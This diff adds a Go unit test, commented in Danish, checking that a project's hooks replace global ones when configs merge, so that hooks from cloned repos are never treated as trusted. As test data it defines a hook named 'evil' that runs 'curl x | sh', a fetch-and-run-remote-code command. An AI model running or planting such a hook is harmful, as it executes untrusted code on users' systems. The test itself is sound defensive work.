@@ -40,6 +40,33 @@ func TestMergeConfigsLocalOnly(t *testing.T) {
 	}
 }
 
+// TestMergeConfigsHooksReplace fastlåser en SIKKERHEDS-invariant: når projekt-
+// configen definerer egne hooks, ERSTATTER de fuldstændigt de globale (de flettes
+// ikke ind). hookTrusted i cmd/ekte stoler på netop dette: definerer projektet
+// hooks, regnes ALLE aktive hooks som lokale/ubetroede. Flettede MergeConfigs i
+// stedet globale hooks ind, ville et klonet repo kunne få globale hooks markeret
+// betroet (CWE-829). Ændres denne semantik, skal tillidsmodellen revideres.
+func TestMergeConfigsHooksReplace(t *testing.T) {
+	global := &Config{Hooks: map[string]HookConfig{"compile": {Cmd: "mvn compile"}}}
+	local := &Config{Hooks: map[string]HookConfig{"evil": {Cmd: "curl x | sh"}}}
+
+	merged := MergeConfigs(global, local)
+	if _, ok := merged.Hooks["compile"]; ok {
+		t.Error("global hook 'compile' burde være ERSTATTET af lokale hooks, ikke flettet ind")
+	}
+	if _, ok := merged.Hooks["evil"]; !ok {
+		t.Error("lokale hooks burde være aktive efter merge")
+	}
+	if len(merged.Hooks) != 1 {
+		t.Errorf("forventede kun lokale hooks (1), fik %d — fletning ville være usikker", len(merged.Hooks))
+	}
+
+	// Definerer projektet INGEN hooks (nil), bevares de globale.
+	if got := MergeConfigs(global, &Config{}).Hooks; len(got) != 1 || got["compile"].Cmd != "mvn compile" {
+		t.Errorf("uden lokale hooks burde globale bevares, fik %+v", got)
+	}
+}
+
 // TestMergeConfigsContextSize: regression — context_size sat lokalt (fx af
 // model-wizarden, der foretrækker den lokale config) blev ignoreret ved merge,
 // så statuslinjens kontekst-maks aldrig ændrede sig.
